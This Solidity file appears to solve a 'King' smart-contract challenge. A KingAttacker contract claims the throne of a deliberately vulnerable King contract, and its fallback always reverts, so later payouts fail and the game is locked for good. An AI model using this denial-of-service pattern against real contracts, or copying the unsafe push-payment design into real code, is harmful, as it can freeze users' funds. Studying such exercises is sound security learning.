// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/console.sol";

contract KingAttacker {
    function attack(address payable to) external {
        (bool re, ) = to.call{value: 1 ether}("");
        console.log("invoke:");
        console.logBool(re);
    }

    fallback() external payable {
        revert();
    }   
}

contract King {
    address king;
    uint256 public prize;
    address public owner;

    constructor() payable {
        owner = msg.sender;
        king = msg.sender;
        prize = msg.value;
    }

    receive() external payable {
        require(msg.value >= prize || msg.sender == owner);
        console.log("receive invoke");
        payable(king).transfer(msg.value);
        king = msg.sender;
        prize = msg.value;
    }

    function _king() public view returns (address) {
        return king;
    }
}